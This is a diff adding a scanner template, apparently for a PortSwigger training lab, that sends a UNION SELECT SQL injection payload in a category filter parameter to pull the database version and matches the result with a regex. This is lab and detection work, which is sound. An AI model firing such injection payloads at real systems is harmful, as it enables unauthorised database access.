@@ -1,0 +1,22 @@
+id: PORTSWIGGERLaboratorioInyecSQLunionSELECTversionDB
+
+info:
+  name: P4IM0NTEMPLATE Inyec SQL UNION SELECT version DB
+  author: P4IM0N
+  severity: info
+  description: |
+    This template exploits an SQL Injection vulnerability in the product category filter to extract the database version using a UNION SELECT attack.
+
+http:
+  - raw:
+      - |
+        GET /filter?category=Accessories%27%20UNION%20SELECT%20@@version,%20NULL%23 HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "<th>8\\.0\\.39-0ubuntu0\\.20\\.04\\.1</th>"
